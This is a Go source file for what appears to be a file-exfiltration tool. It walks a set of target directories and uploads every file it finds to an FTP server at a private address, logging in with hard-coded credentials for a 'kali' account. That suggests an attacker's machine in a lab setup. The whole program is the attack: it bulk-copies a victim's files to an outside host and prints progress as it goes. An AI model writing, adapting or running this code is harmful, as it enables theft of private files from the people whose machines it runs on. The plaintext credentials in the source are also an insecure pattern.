package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
)

// Recursively scan the folder without including subdirectory
func listFilesInDir(dirPath string) ([]string, error) {
	var files []string
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			files = append(files, path) // Store file in array and used for future operation
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func main() {
	// Get directory from "directory.go"
	directories, err := GetDirectories()
	if err != nil {
		log.Fatalf("Error retrieving directories: %v", err)
	}

	// FTP configuration
	ftpServer := "192.168.60.133"
	ftpPort := 21
	ftpUser := "kali"
	ftpPassword := "qwerty1234"

	// call to FTP connection function on "ftp.go"
	ftpClient, err := ConnectToFTP(ftpServer, ftpPort, ftpUser, ftpPassword)
	if err != nil {
		log.Fatalf("Error connecting to FTP: %v", err)
	}
	defer ftpClient.Quit()

	// Explore directory and upload file
	for _, dir := range directories {
		fmt.Printf("Scanning directory: %s\n", dir)
		files, err := listFilesInDir(dir)
		if err != nil {
			log.Printf("Error scanning directory %s: %v\n", dir, err)
			continue
		}

		for _, file := range files {
			remotePath := filepath.Base(file) // Only file name, change if needed structure
			fmt.Printf("Uploading file: %s\n", file)
			err := UploadFileToFTP(ftpClient, file, remotePath)
			if err != nil {
				log.Printf("Failed to upload file %s: %v\n", file, err)
			} else {
				fmt.Printf("Successfully uploaded %s\n", file)
			}
		}
	}

	fmt.Println("File upload completed.")
	fmt.Println("Press any key to close...")
	fmt.Scanln()
	defer ftpClient.Quit() // Remove this line if you want keep connection once upload is done
}
